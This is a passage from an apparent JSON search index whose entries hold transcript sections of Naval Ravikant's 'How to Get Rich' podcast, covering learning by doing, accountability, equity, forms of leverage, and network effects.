then as you\u2019re adding in, persuasion, which is talking. And then finally, I would add computer programming just because it\u2019s an applied form of arithmetic that just gets you so much leverage for free in any domain that you operate in. If you\u2019re good with computers, if you\u2019re good at basic mathematics, if you\u2019re good at writing, if you\u2019re good at speaking, and if you like reading, you\u2019re set for life.","title":"The Foundations Are Math and Logic"},{"location":"other/How%20to%20Get%20Rich/#theres-no-actual-skill-called-business","text":"Avoid business schools and magazines There\u2019s no actual skill called \u2018business\u2019 Naval: In that sense, business to me is bottom of the barrel. There\u2019s no actual skill called business, it\u2019s too generic. It\u2019s like a skill called \u201crelating.\u201d Like \u201crelating to humans.\u201d That\u2019s not a skill, it\u2019s too broad. A lot of what goes on in business schools, and there is some very intelligent stuff taught in business schools \u2013 I don\u2019t mean to detract from them completely \u2013 some of the things taught in business school are just anecdotes. They call them \u201ccase studies.\u201d But they\u2019re just anecdotes, and they\u2019re trying to help you pattern match by throwing lots of data points at you, but the reality is, you will never understand them fully until you\u2019re actually in that position yourself. Even then you will find that basic concepts from game theory, psychology, ethics, mathematics, computers, and logic will serve you much, much better. I would focus on the foundations, I would focus with a science bent. I would develop a love for reading, including by reading so-called junk food that you\u2019re not supposed to read. You don\u2019t have to read the classics. That [reading] is the foundation for your self-education. Doing is faster than watching Nivi: What did you mean when you said that \u201cdoing is faster than watching?\u201d Naval: When it comes to your learning curve, if you want to optimize your learning curve\u2026 One of the reasons why I don\u2019t love podcasts, even though I\u2019m a generator of podcasts, is that I like to consume my information very quickly. And I\u2019m a good reader, or a fast reader and I can read very fast but I can only listen at a certain speed. I know people listen at 2x, 3x, but everyone sounds like a chipmunk and it\u2019s hard to go back, it\u2019s hard to highlight, it\u2019s hard to pinpoint snippets and save them in your notebook, and so on. Similarly, a lot of people think they can become really skilled at something by watching others do it, or even by reading about others doing it. And going back to the business school case study, that\u2019s a classic example. They study other people\u2019s businesses, but in reality, you\u2019re going to learn a lot more about running a business by operating your own lemonade stand or equivalent. Or even opening a little retail store down the street. That is how you\u2019re going to learn on the job because a lot of the subtleties don\u2019t express themselves until you\u2019re actually in the business. For example, everyone\u2019s into mental models these days. You go to Farnam Street, you go to Poor Charlie\u2019s Almanack, and you can learn all the different mental models. But which ones matter more? Which ones do you apply more often? Which ones matter in which circumstances? That\u2019s actually the hard part. For example, my personal learning has been that the principal-agent problem drives so much in this world. It\u2019s an incentives problem. I\u2019ve learned that tit-for-tat iterated prisoner\u2019s dilemma is the piece of game theory that is worth knowing the most. You can almost put down the game theory book after that. By the way, the best way to learn game theory is to play lots of games. I never even read game theory books. I consider myself extremely good at game theory. I\u2019ve never opened up a game theory book and found a result in there where I didn\u2019t think, \u201cOh, yeah, that\u2019s common sense to me.\u201d The reason is that I grew up playing all kinds of games and I ran into all kinds of corner cases with all kinds of friends, and so it\u2019s just second nature to me. You can always learn better by doing it on the job. The number of \u2018doing\u2019 iterations drives the learning curve But doing is a subtle thing. Doing encapsulates a lot. For example, let\u2019s say, I want to learn how to run a business. Well, if I start a business where I go in every day and I\u2019m doing the same thing, let\u2019s say I\u2019m running a retail store down the street where I\u2019m stocking the shelves with food and liquor every single day, I\u2019m not going to learn that much because I\u2019m repeating things a lot. So, I\u2019m putting in thousands of hours, but they are thousands of hours doing the same thing. Whereas if I was putting in thousands of iterations, that would be different. So, the learning curve is across iterations [not iterations]. So if I was trying new marketing experiments in the store all the time, I was constantly changing up the inventory, I was constantly changing up the branding and the messaging, I was constantly changing the sign, I was constantly changing the online channels that are used to drive foot traffic in, I was experimenting with being open at different hours, I had the ability to walk around and talk to other store owners and getting their books and figure out how they run their businesses. It\u2019s the number of iterations that drives the learning curve. So, the more iterations you can have, the more shots on goal you can have, the faster you\u2019re going to learn. It\u2019s not just about the hours put in. If you\u2019re willing to bleed a little every day, you may win big later It\u2019s actually a combination of the two, but I think just the way we\u2019re built and the way that the world presents itself, the world offers us very easily the opportunity to do the same thing over and over and over again. But really, we\u2019d be better served if we went off and found ways to do new things from scratch. And doing something new the first time is painful, because you\u2019re wandering into uncertain territory and high odds are that you will fail. So you just have to get very, very comfortable with frequent small failures. Nassim Taleb talks about this also. He made his fortune, his wealth by being a trader who basically relied upon black swans. Nassim Taleb made money by losing little bits of money every day and then once in a blue moon he would make a lot of money when the unthinkable happened for other people. Whereas most people want to make little bits of money every day and in exchange they\u2019ll tolerate lots of blow-up risk, they\u2019ll tolerate going completely bankrupt. We\u2019re not evolved to bleed a little bit every day. If you\u2019re out in the natural environment, and you get a cut and you\u2019re literally bleeding a little bit every day, you will eventually die. You\u2019ll have to stop that cut. We\u2019re evolved for small victories all the time but that becomes very expensive. That\u2019s where the crowd is. That\u2019s where the herd is. So, if you\u2019re willing to bleed a little bit every day but in exchange you\u2019ll win big later, you will do better. That is, by the way, entrepreneurship. Entrepreneurs bleed every day. They\u2019re not making money, they\u2019re losing money, they\u2019re constantly stressed out, all the responsibility is upon them, but when they win they win big. On average they\u2019ll make more.","title":"There\u2019s No Actual Skill Called \u2018Business\u2019"},{"location":"other/How%20to%20Get%20Rich/#embrace-accountability-to-get-leverage","text":"Take risks under your own name and society will reward you with leverage You need accountability to get leverage Nivi: Why don\u2019t we jump into accountability, which I thought was pretty interesting and I think you have your own unique take on it. So the first tweet on accountability was, \u201cEmbrace accountability and take business risks under your own name. Society will reward you with responsibility, equity, and leverage.\u201d Naval: Yeah. So to get rich, you\u2019re going to need leverage. Leverage comes in labor, comes in capital, or it can come through code or media. But most of these, like labor and capital, people have to give to you. For labor, somebody has to follow you. For capital, somebody has to give you money or assets to manage or machines. So to get these things, you have to build up credibility and you have to do those under your own name as much as possible, which is risky. So accountability is a double-edged thing. It allows you to take credit when things go well and to bear the brunt of the failure when things go badly. Take business risks under your own name So in that sense, people who are stamping their names on things aren\u2019t foolish. They\u2019re just confident. Maybe it turns out to be foolish in the end, but if you look at a Kanye or an Oprah or a Trump or an Elon or anyone like that, these people can get rich just off their name because their name is such powerful branding. Regardless of what you think of Trump, you have to realize that the guy was among the best in the world at just branding his name. Why would you go to Trump Casino? Used to be because Trump. Why would you go to a Trump tower? Because of Trump. When it came time to vote, I think that a lot of voters just went in and said, \u201cTrump.\u201d They recognize the name, so the name recognition paid off. Same thing with Oprah. She puts her brand on something, her name on something and it flies off the shelves, and it\u2019s like an instant validator. These people also take risks for putting their name out there. Obviously Trump is now probably hated by half or more than half of the country and by a big chunk of the world as he sticks his name out there. By putting your name out there, you become a celebrity, and fame has many, many downsides. It\u2019s better to be anonymous and rich than to be poor and famous, but even famous and rich has a lot of downsides associated with it. You\u2019re always in the public eye. A well-functioning team has clear accountability for each position Accountability is quite important, and when you\u2019re working to build a product or you\u2019re working in a team or you\u2019re working in a business, we constantly have drummed into our heads how important it is to be part of a team. Absolutely agree with that. A lot of our training socially is telling us to not stick our necks out of the crowd. There\u2019s a saying that I hear from our Australian friends that the tall poppy gets cut. Don\u2019t stick your neck out, but I would say that actually a really, really well-functioning team is small and has clear accountability for each of the different portions. You can say, \u201cOkay, this person\u2019s responsible for building the product. This person\u2019s responsible for the messaging. This person\u2019s responsible for raising money. This person\u2019s responsible for the pricing strategy and maybe the online advertising.\u201d So if somebody screws up, you know exactly who\u2019s responsible. While at the same time if something goes really well, you also know exactly who\u2019s responsible. If you have a small team and you have clearly delineated responsibilities, then you can still keep a very high level of accountability. Accountability is really important because when something succeeds or fails, if it fails, everybody points fingers at each other, and if it succeeds, everybody steps forward to take credit. We\u2019ve all had that experience when we were in school and we got a group assignment to do. There were probably a few people in there who did a lot of the work. Then there are a few people who just did a lot of grandstanding or positioning to do the work. We\u2019re all familiar with this from a childhood sense, but it\u2019s sort of uncomfortable to talk about. People who can fail in public have a lot of power Clear accountability is important. Without accountability, you don\u2019t have incentives. Without accountability, you can\u2019t build credibility. But you take risk. You take risk of failure. You take risk of humiliation. You take risk of failure under your own name. Luckily in modern society, there\u2019s no more debtors\u2019 prison and people don\u2019t go to jail or get executed for losing other people\u2019s money, but we\u2019re still socially hard wired to not fail in public under our own names. The people who have the ability to fail in public under their own names actually gain a lot of power . For example, I\u2019ll give a personal anecdote. Up until about 2013, 2014, my public persona was an entirely around startups and investing. Only around 2014, 2015 did I start talking about philosophy and psychological things and broader things. It made me a little nervous because I was doing it under my own name. There were definitely people in the industry who sent me messages through the back channel like, \u201cWhat are you doing? You\u2019re ending your career. This is stupid.\u201d I kind of just went with it. I took a risk. Same with crypto. Early on, I took a risk. But when you put your name out there, you take a risk with certain things. You also get to reap the rewards. You get the benefits.","title":"Embrace Accountability to Get Leverage"},{"location":"other/How%20to%20Get%20Rich/#take-accountability-to-earn-equity","text":"If you have high accountability, you\u2019re less replaceable Accountability is how you\u2019re going to get equity Naval: Accountability is important because that\u2019s how you\u2019re going to get leverage. That\u2019s how you\u2019re going to get credibility. It\u2019s also how you\u2019re going to get equity. You\u2019re going to get a piece of the business. When you\u2019re negotiating with other people, ultimately if someone else is making a decision about how to compensate you, that decision will be based on how replaceable you are. If you have high accountability, that makes you less replaceable. Then they have to give you equity, which is a piece of the upside. Taking accountability is like taking equity in all your work Equity itself is a good example because equity is also a risk-based instrument. Equity means you get paid everything after all the people who need guaranteed money are paid back. If you look at the hierarchy of capital in a company, the employees get paid first. They get paid the salary first. In legal [bankruptcy] proceedings, the salaries are sacrosanct. If you\u2019re a board member and the company spends too much money and has back salaries to pay, the government can go after you personally to pay back the salaries. The employees get the most security, but in exchange for that security, they don\u2019t have as much upside. Next in line would be the debt holders who are maybe the bankers who lend money to the company for operations and they need to make their fixed coupon every month or every year, but they don\u2019t get much more upside beyond that. They might be making 5, 10, 15, 20, 25% a year, but that\u2019s what their upside is limited to. Finally there are the equity holders. These people are actually going to get most of the upside. Once the debt holders are paid off and the salaries are paid off, whatever remains goes to them. But if there isn\u2019t enough money to pay off the salaries and the debt holders, or if there\u2019s just barely enough to pay off the salary and the debt holders, which is what happens with most businesses, most of the times, the equity holders get nothing. The equity holders take on greater risk, but in exchange, they get nearly unlimited upside. You can do the same with all of your work. Essentially, taking accountability for your actions is the same as taking an equity position in all of your work. You\u2019re taking greater downside risk for greater upside. Realize that in modern society, the downside risk is not that large. Even personal bankruptcy can wipe the debts clean in good ecosystems. I\u2019m most familiar with Silicon Valley, but generally people will forgive failures as long as you were honest and made a high integrity effort. There\u2019s not really that much to fear in terms of failure, and so people should be taking on a lot more accountability than they actually are. Nivi: Is accountability actually fragile or do you really just mean that we\u2019re hardwired not to fail in public, so it just feels like it\u2019s a fragile thing? Naval: I think it could actually be fragile. An example of accountability is you\u2019re an airplane pilot. As a captain, you\u2019re taking on accountability for the entire plane. Let\u2019s say that something goes wrong with the aircraft. You can\u2019t later blame it on anyone else. You can\u2019t blame it on the steward or the stewardess. You can\u2019t blame it on the copilot. You\u2019re the captain. You\u2019re responsible for the ship. If you screw up, you crash the ship, and there are immediate consequences. In the old days, the captain was expected to go down with the ship. If the ship was sinking, then literally the last person who got to get off was the captain. I think accountability does come with real risks, but we\u2019re talking about a business context. The risk here would be that you would probably be the last one to get your capital back out. You\u2019d be the last one to get paid for your time. The time that you\u2019ve put in, the capital that you\u2019ve put into the company, these are what are at risk. Even if a business fails and your name\u2019s on it, that\u2019s not as bad as if it turns out to be an integrity issue. Bernie Madoff, for example, Madoff investments, that name is never going to be good again in the investment community. You could be Bernie Madoff\u2019s great-great-great-grandson. You are not going to go into the investment business because he ruined the family name. I think these days the accountability risk with a name happens more around integrity, rather than it does around purely economic failure. Accountability is reputational skin in the game Nivi: The big takeaway for me on accountability is that you will be rewarded directly in proportion with your accountability. I also think this is why people like Taleb rail against CEOs who get rewards without accountability. Naval: Yeah. Taleb\u2019s Skin In The Game is required reading. If you want to get anywhere in modern life and understand how modern systems work, then Skin In The Game would be near the top of my list to read. Accountability, skin in the game, these concepts go very closely hand in hand. I think of accountability as reputational skin in the game. It\u2019s putting your personal reputation on the line as skin in the game. Accountability is a simple concept. The only part of accountability that may be a little counterintuitive is that we\u2019re currently socially brainwashed to not take on accountability, not in a visible way. I think there are ways to take on accountability where every member of a team can take on accountability for their portion. That is how you get a well-functioning team while still putting credits and losses in the correct columns.","title":"Take Accountability to Earn Equity"},{"location":"other/How%20to%20Get%20Rich/#labor-and-capital-are-old-leverage","text":"Everyone is fighting over labor and capital Our brains aren\u2019t evolved to comprehend new forms of leverage Nivi: Why don\u2019t we talk a little bit about leverage? The first tweet in the storm was a famous quote from Archimedes, which was, \u201cGive me a lever long enough and a place to stand and I will move the Earth.\u201d The next tweet was, \u201cFortunes require leverage. Business leverage comes from capital, people and products with no marginal costs of replication.\u201d Naval: Leverage is critical. The reason I stuck in Archimedes quote in there is\u2026 normally I don\u2019t like putting other people\u2019s quotes in my Twitter. That doesn\u2019t add any value. You can go look up those people\u2019s quotes. But this quote I had to put in there because it\u2019s just so fundamental. I read it when I was very, very young and it had a huge impression on me. We all know what leverage is when we use a seesaw or a lever. We understand how that works physically, but I think what our brains aren\u2019t really well-evolved to comprehend is how much leverage is possible in modern society and what the newest forms of leverage are. Society overvalues labor leverage The oldest form of leverage is labor, which is people working for you. Instead of me lifting rocks, I can have 10 people lift rocks. Then just by my guidance on where the rock should go, a lot more rocks get moved than I could do myself. Everybody understands this because we\u2019re evolved to understand the labor form of leverage, so what happens is society overvalues labor as a form of leverage. This is why your parents are impressed when you get a promotion and you have lots of people working underneath you. This is why when a lot of naive people, when you tell them about your company, they\u2019ll say, \u201cHow many people work there?\u201d They\u2019ll use that as a way to establish credibility. They\u2019re trying to measure how much leverage and impact you actually have. Or when someone starts a movement, they\u2019ll say how many people they have or how big the army is. We just automatically assume that more people is better. You want the minimum amount of labor that allows you to use the other forms of leverage I would argue that this is the worst form of leverage that you could possibly use. Managing other people is incredibly messy. It requires tremendous leadership skills. You\u2019re one short hop from a mutiny or getting eaten or torn apart by the mob. It\u2019s incredibly competed over. Entire civilizations have been destroyed over this fight. For example, communism, Marxism, is all about the battle between capital and labor, das kapital and das labor. It\u2019s kind of a trap. You really want to stay out of labor-based leverage. You want the minimum amount of people working with you that are going to allow you to use the other forms of leverage, which I would argue are much more interesting. Capital has been the dominant form of leverage in the last century The second type of leverage is capital. This one\u2019s a little less hardwired into us because large amounts of money moving around and being saved and being invested in money markets, these are inventions of human beings the in last few hundred to few thousand years. They\u2019re not evolved with us from hundreds of thousands of years. We understand them a little bit less well. They probably require more intelligence to use correctly, and the ways in which we use them keep changing. Management skills from a hundred years ago might still apply today, but investing in the stock market skills from a hundred years ago probably don\u2019t apply to the same level today. Capital is a trickier form of leverage to use. It\u2019s more modern. It\u2019s the one that people have used to get fabulously wealthy in the last century. It\u2019s probably been the dominant form of leverage in the last century. You can see this by who are the richest people. It\u2019s bankers, politicians in corrupt countries who print money, essentially people who move large amounts of money around. If you look at the top of very large companies, outside of technology companies, in many, many large old companies, the CEO job is really a financial job. They\u2019re really financial asset managers. Sometimes, an asset manager can put a pleasant face on it, so you get a Warren Buffet type. But deep down, I think we all dislike capital as a form of leverage because it feels unfair. It\u2019s this invisible thing that can be accumulated and passed across generations and suddenly seems to result in people having gargantuan amounts of money with nobody else around them or necessarily sharing in it. That said, capital is a powerful form of leverage. It can be converted to labor. It can be converted to other things. It\u2019s very surgical, very analytical. If you are a brilliant investor and give $1 billion and you can make a 30% return with it, whereas anybody else can only make a 20% return, you\u2019re going to get all the money and you\u2019re going to get paid very handsomely for it. It scales very, very well. If you get good at managing capital, you can manage more and more capital much more easily than you can manage more and more people. You need specific knowledge and accountability to obtain capital It is a good form of leverage, but the hard part with capital is how do you obtain it? That\u2019s why I talked about specific knowledge and accountability first. If you have specific knowledge in a domain and if you\u2019re accountable and you have a good name in that domain, then people are going to give you capital as a form of leverage that you can use to then go get more capital. Capital also is fairly well understood. I think a lot of the knocks against capitalism come because of the accumulation of capital.","title":"Labor and Capital Are Old Leverage"},{"location":"other/How%20to%20Get%20Rich/#product-and-media-are-new-leverage","text":"Create software and media that work for you while you sleep Product and media are the new leverage Naval: The most interesting and the most important form of leverage is this idea of products that have no marginal cost of replication. This is the new form of leverage. This was only invented in the last few hundred years. It got started with the printing press. It accelerated with broadcast media, and now it\u2019s really blown up with the Internet and with coding. Now, you can multiply your efforts without having to involve other humans and without needing money from other humans. This podcast is a form of leverage. Long ago, I would have had to sit in a lecture hall and lecture each of you personally. I would have maybe reached a few hundred people and that would have been that. Then 40 years ago, 30 years ago, I would have to be lucky to get on TV, which is somebody else\u2019s leverage. They would have distorted the message. They would taken the economics out of it or charged me for it. They would have muddled the message, and I would have been lucky to get that form of leverage. Today, thanks to the Internet, I can buy a cheap microphone, hook it up to a laptop or an iPad, and there you are all listening. Product leverage is where the new fortunes are made This newest form of leverage is where all the new fortunes are made, all the new billionaires. The last generation, fortunes were made by capital. That was the Warren Buffets of the world. But the new generation\u2019s fortunes are all made through code or media. Joe Rogan making 50 to a 100 million bucks a year from his podcast. You\u2019re going to have a PewDiePie. I don\u2019t know how much money he\u2019s rolling in, but he\u2019s bigger than the news. The Fortnite players. Of course Jeff Bezos and Mark Zuckerberg and Larry Page and Sergey Brin and Bill Gates and Steve Jobs. That is all code-based leverage. Combining all three forms of leverage is a magic combination Now, the beauty is when you combine all of these three. That\u2019s where tech startups really excel, where you take just the minimum, but highest output labor that you can get, which are engineers, and designers, product developers. Then you add in capital. You use that for marketing, advertising, scaling. You add in lots of code and media and podcasts and content to get it all out there. That is a magic combination, and that\u2019s why you see technology startups explode out of nowhere, use massive leverage and just make huge outsize returns. Product and media leverage are permissionless Nivi: Do you want to talk a little bit about permissioned versus permissionless? Naval: Probably the most interesting thing to keep in mind about the new forms of leverage is they are permissionless. They don\u2019t require somebody else\u2019s permission for you to use them or succeed. For labor leverage, somebody has to decide to follow you. For capital leverage, somebody has to give you money to invest or to turn into a product. Coding, writing books, recording podcasts, tweeting, YouTubing, these kinds of things, these are permissionless. You don\u2019t need anyone\u2019s permission to do them, and that\u2019s why they are very egalitarian. They\u2019re great equalizers of leverage. As much as people may rail on Facebook and YouTube, they\u2019re not going to stop using it because this permissionless leverage, where everyone can be a broadcaster, is just too good. The same way you can rail upon Apple for having a slightly closed ecosystem in the iPhone, but everyone\u2019s writing apps for it. As long as you can write apps for it, you can get rich or reach users doing that, why not? The robot army is already here\u2014code lets you tell them what to do I think of all the forms of leverage, the best one in modern society \u2026 This is glib. This is a little overused. This is why I tell people learn to code. It\u2019s that we have this idea that in the future there\u2019s going to be these robots and they\u2019re going to be doing everything. That may be true, but I would say that the majority of the robot revolution has already happened. The robots are already here and there are way more robots than there are humans, it\u2019s just that we pack them in data centers for heat and efficiency reasons. We put them in servers. They\u2019re inside the computers. All the circuits, it\u2019s robot minds inside that\u2019s doing all the work. Every great software developer, for example, now has an army of robots working for him at nighttime, while he or she sleeps, after they\u2019ve written the code and it\u2019s just cranking away. The robot army is already here. The robot revolution has already happened. We\u2019re about halfway through it. We\u2019re just adding in much more of the hardware component these days as we get more comfortable with the idea of autonomous vehicles and autonomous airplanes and autonomous ships and maybe autonomous trucks. There\u2019re delivery bots and Boston Dynamics robots and all that. But robots who are doing web searching for you, for example, are already here. The ones who are cleaning up your video and audio and transmitting it around the world are already here. The ones who are answering many customer service queries, things that you would have had to call a human for are already here. An army of robots is already here. It\u2019s very cheaply available. The bottleneck is just figuring out intelligent and interesting things to do to them. Essentially you can order this army of robots around. The commands have to be issued in a computer language, in a language that they understand. These robots aren\u2019t very smart. They have to be told very precisely what to do and how to do it. Coding is such a great superpower because now you can speak the language of the robot armies and you can tell them what to do. Nivi: I think at this point, people are not only commanding the army of robots within servers through code, they\u2019re actually manipulating the movement of trucks, of other people. Just ordering a package on Amazon, you\u2019re manipulating the movement of many people and many robots to get a package delivered to you. People are doing the same things to build businesses now. There\u2019s the army of robots within servers and then there\u2019s also an army of actual robots and people that are being manipulated through software.","title":"Product and Media Are New Leverage"},{"location":"other/How%20to%20Get%20Rich/#product-leverage-is-egalitarian","text":"The best products tend to be available to everyone Product leverage is a positive-sum game Naval: Labor and capital are much less egalitarian, not just in the inputs, but in their outputs. Let\u2019s say that I need something that humans have to provide like if I want a massage or if I need someone to cook my food. The more of a human element there is in providing that service, the less egalitarian it is. Jeff Bezos probably has much better vacations than most of us because he has lots of humans running around doing whatever he needs to do. If you look at the output of code and media, Jeff Bezos doesn\u2019t get to watch better movies and TV than we do. Jeff Bezos doesn\u2019t get to even have better computing experience. Google doesn\u2019t give him some premium, special Google account where his searches are better. It\u2019s the nature of code and media output that the same product is accessible to everybody. It turns into a positive sum game where if Jeff Bezos is consuming the same product as a thousand other people, that product is going to be better than the version that Jeff would consume on his own. Status goods are limited to a few people Whereas with other products, that\u2019s not true. If you look at something like buying a Rolex, which is no longer about telling time. It\u2019s a signaling good. It\u2019s all about showing off, \u201cI have a Rolex.\u201d That\u2019s a zero-sum game. If everybody in the world is wearing a Rolex, then people don\u2019t want to wear Rolexes anymore because they no longer signal. It\u2019s canceled out the effect. Rich people do have an advantage in consuming that product. They\u2019ll just price it up until only they can have Rolexes. Then poor people can\u2019t have Rolexes and Rolexes resume their signaling value. The best products tend to be targeted at the middle class Something like watching Netflix or using Google or using Facebook or YouTube or even frankly modern day cars. Rich people don\u2019t have better cars. They just have weirder cars. You can\u2019t drive a Lamborghini on the street at any speed that makes sense for a Lamborghini, so it\u2019s actually a worse car in the street. It just turned into a signaling good at that point. Your sweet spot, where you want to be, is somewhere like a Tesla Model 3 or like a Toyota Corolla which is an amazing car. A new Toyota Corolla is a really nice car, but because it\u2019s mainstream, the technology has amortized the cost of production over the largest number of consumers possible. The best products tend to be at the center, at the sweet spot, the middle class, rather than being targeted at the upper class. Creating wealth with product leads to more ethical wealth I think one of the things that we don\u2019t necessarily appreciate in modern societies is as the forms of leverage have gone from being human-based, labor-based and being capital-based to being more product and code and media-based, that most of the goods and services that we consume are becoming much more egalitarian in their consumption. Even food is becoming that way. Food is becoming cheap and abundant, at least in the first world, too much so to our detriment. Jeff Bezos isn\u2019t necessarily eating better food. He\u2019s just eating different food or he\u2019s eating food that\u2019s prepared and served theatrically, so it\u2019s almost like more of again the human element of performance. But the labor element out of food production has gone down massively. The capital element has gone down massively. Even food production itself has become more technology-oriented, and so the gap between the haves and the have-nots is getting smaller. If you care about ethics in wealth creation, it is better to create your wealth using code and media as leverage because then those products are equally available to everybody as opposed to trying to create your wealth through labor or capital. You want to use the product that is used by the most people What I\u2019m referring to here is scale economies. Technology products and media products have such amazing scale economies that you always want to use the product that is used by the most people. The one that\u2019s used by the most people ends up having the largest budget. There\u2019s no marginal cost of adding another user, and so with the largest budget, you get the highest quality. The best TV shows are actually not going to be some obscure ones just made for a few rich people. They\u2019re going to be the big budget ones, like the Game of Thrones or the Breaking Bad or Bird Box, where they have massive, massive budgets. They can just use those budgets to get to a certain quality level. Then rich people, to be different, they have to fly to Sundance and watch a documentary. You and I aren\u2019t going to fly to Sundance because that\u2019s something that bored rich people do to show off. We\u2019re not going to watch a documentary because most of them just aren\u2019t actually even that good. Again, if you\u2019re wealthy today, for large classes of things, you spend your money on signaling goods to show other people that you\u2019re wealthy, then you try and convert them to status. As opposed to actually consuming the goods for their own sake. Nivi: People and capital as a form of leverage have a negative externality and code and product have a positive externality attached to them, if I was going to sum up your point. Capital and labor are becoming permissionless I think that capital and labor are also starting to become a little more permissionless or at least the permissioning is diffuse because of the Internet. Instead of labor, we have community now, which is a diffused form of labor. For example, Mark Zuckerberg has a billion people doing work for him by using Facebook. Instead of going to raise capital from someone who\u2019s rich, now we have crowdfunding. You can raise millions and millions of dollars for a charity, for a health problem or for a business. You can do it all online. Capital and labor are also becoming permissionless, and you don\u2019t need to necessarily do it the old fashioned way, where you have to go around and ask people for permission to use their money or their time.","title":"Product Leverage is Egalitarian"},{"location":"other/How%20to%20Get%20Rich/#pick-a-business-model-with-leverage","text":"An ideal business model has network effects, low marginal costs and scale economies Scale economies: the more you produce, the cheaper it gets Nivi: One more question about leverage. Do you think a choice of business model or a choice of product can also bring a kind of leverage to it? For example, pursuing a business that has network effects. Pursuing a business that has brand effects. Or other choices of business model that people could manipulate that just give you free leverage. Naval: Yeah, there\u2019s some really good microeconomic concepts that are important to understand. One of those is scale economies, which is the more you produce of something the cheaper it gets to make it. That\u2019s something that a lot of businesses have, Basic Economics 101. You should try and get into a business where making Widget Number 12 is cheaper than making Widget Number 5, and making Widget Number 10,000 is a lot cheaper than the previous ones. This builds up an automatic barrier to entry against competition and getting commoditized. That\u2019s an important one. Zero marginal cost of reproduction: producing more is free Another one is, and this is along the same lines, but technology products especially, and media products, have this great quality where they have zero marginal cost of reproduction. Creating another copy of what you just created is free. When somebody listens to this podcast or watches a YouTube video about this, it doesn\u2019t cost me anything for the next person who shows up. Those zero marginal cost things, they take a while to get going because you make very little money per user, but over time they can really, really add up. Joe Rogan is working no harder on his current podcast than he was on Podcast number 1, but on Podcast number 1,100 he\u2019s making a million dollars from the podcast whereas for the previous one he probably lost money; for the first one. That\u2019s an example of zero marginal cost. Network effects: value grows as the square of the customers Then, the most subtle but the most important is this idea of network effects. It comes from computer networking. Bob Metcalfe, who created Ethernet, famously coined Metcalfe\u2019s Law, which is the value of a network is proportional to the square of the number of nodes in the network. If a network of size 10 would have a value of a 100, a network of a size 100 would have a value of 10,000. It\u2019s not just 10 times more, it\u2019s 100 times more, because of the square; the difference is the square. You want to be in a network effects business, assuming you\u2019re not number two. If you\u2019re number one in network effect business, you win everything. Example: if you look at Facebook, your friends and family social networking protocol. Who\u2019s their competitor? Nobody, because they won everything through network effects. Which is why when people say, \u201cWell, I can just switch away from Facebook,\u201d they don\u2019t realize that network effects create natural monopolies. They\u2019re very, very powerful things. Network effect businesses are natural monopolies One of the dirty secrets of Silicon Valley is that a lot of the winning businesses are natural monopolies. Even ride-sharing tends towards one winner-take-all system. Uber will always have better economics than Lyft, as long as it\u2019s moving more drivers and more riders around. Something like Google, there\u2019s basically only one viable search engine. I do like DuckDuckGo, privacy reasons, but they\u2019re just always gonna be behind because of network effects. Twitter: where else would you go for microblogging? Even YouTube has weak network effects, but they\u2019re still powerful enough that there\u2019s really no number two site that you go to, to consume your video on a regular basis. It even turns out in e-tail, Amazon Prime and kind of the convenience of stored credit cards and information creates a powerful network effect. In a network effect, each new user adds value to the existing users What is a network effect? Let\u2019s just define it precisely. A network effect is when each additional user adds value to the existing user base. Your users themselves are creating some value for the existing users. The classic example that I think everybody can understand is, language. Let\u2019s say that there\u2019s 100 people living in the community and speak 10 different languages, and each person just speaks one of those 10. Well, you\u2019re having to translate all the time; it\u2019s incredibly painful. But if all 100 of you spoke the same language, it would add tremendous value. The way that community will play out is, 10 people start off speaking 10 languages, and let\u2019s say one extra person learns English. Well, now all of a sudden, 11 people know English, so the next person comes in to learn a new language is probably going to chose English. At some point, let\u2019s say English gets to 20 or 25 people, it\u2019s done. It\u2019s just going to own the entire language marketplace, and the rest of the languages will get competed out. Which is why, long-term, the entire world is probably going to end up speaking English and Chinese. China\u2019s closed off on the Internet, but the Internet itself is a great leveler, and people who want to communicate on the Internet are forced to speak English because the largest community of people on the Internet speaks English. I always feel bad for my colleagues who grew up speaking foreign languages in foreign countries, because you don\u2019t have access to so many books; so many books just haven\u2019t been translated into other languages. If you only spoke French, or you only spoke German, or you only spoke Hindi, for example, you would be at a severe disadvantage in a technical education. Invariably, if you go and get a technical education, you have to learn English just because you have to read these books that have this data that has not been translated. Languages are probably the oldest example of network effect. Money is another example. We should all probably be using the same money, except for the fact that geographic and regulatory boundaries have created these artificial islands of money. But even then, the world tends to use a single currency as the reserve currency at most times; currently, the US dollar. Zero marginal cost businesses can pivot into network effect businesses Network effects are a very powerful concept, and when you\u2019re picking a business model, it\u2019s a really good idea to pick a model where you can benefit from network effects, low marginal costs, and scale economies; and these tend to go together. Anything that has zero marginal costs of production obviously has scale economies, and things that have zero marginal costs of reproduction very often tend to have network effects, because it doesn\u2019t cost you anything more to stamp out the thing. So then you can just create little hooks for users to add value to each other. You should always be thinking about how your users, your customers, can add value to each other because that is the ultimate form of leverage. You\u2019re at the beach in the Bahamas or you\u2019re sleeping at night and your customers are adding value to each other.","title":"Pick a Business Model with Leverage"},{"location":"other/How%20to%20Get%20Rich/#example-from-laborer-to-entrepreneur","text":"From low to high specific knowledge, accountability and leverage Laborers get paid hourly and have low accountability Naval: The tweetstorm is very abstract. It\u2019s deliberately meant to be broadly applicable to all kinds of different domains and disciplines and time periods and places. But sometimes it\u2019s hard to work without a concrete example. So let\u2019s go concrete for a minute. Look at the real estate business. You could start at the bottom, let\u2019s say you\u2019re a day laborer. You come in, you fix people\u2019s houses. Someone orders you around, tells you, \u201cBreak that piece of rock. Sand that piece of wood. Put that thing over there.\u201d There\u2019s just all these menial jobs that go on, on a construction site. If you\u2019re working one of those jobs, unless you\u2019re a skilled trade, say, a carpenter or electrician, you don\u2019t really have specific knowledge. Even a carpenter or an electrician is not that specific because other people can be trained how to do it. You can be replaced. You get paid your $15, $20, $25, $50, if you\u2019re really lucky, $75 an hour, but that\u2019s about it. You don\u2019t have any leverage other than from the tools that you\u2019re using. If you\u2019re driving a bulldozer that\u2019s better than doing it with your hands. A day laborer in India makes a lot less because they have no tool leverage. You don\u2019t have much accountability. You\u2019re a faceless cog in a construction crew and the owner of the house or the buyer of the house doesn\u2019t know or care that you worked on it. General contractors get equity, but they\u2019re also taking risk One step up from that, you might have a contractor, like a general contractor who someone hires to come and fix and repair and build up their house. That general contractor is taking accountability; they\u2019re taking responsibility. Now let\u2019s say they got paid $250,000 for the job. Sorry, I\u2019m using Bay Area prices, so maybe I\u2019ll go rest of the world prices, $100,000 for the job to fix up a house, and it actually costs the general contractor, all said and done, $70,000. That contractor\u2019s going to pocket that remaining $30,000. They got the upside. They got the equity but they\u2019re also taking accountability and risk. If the project runs over and there\u2019s losses, 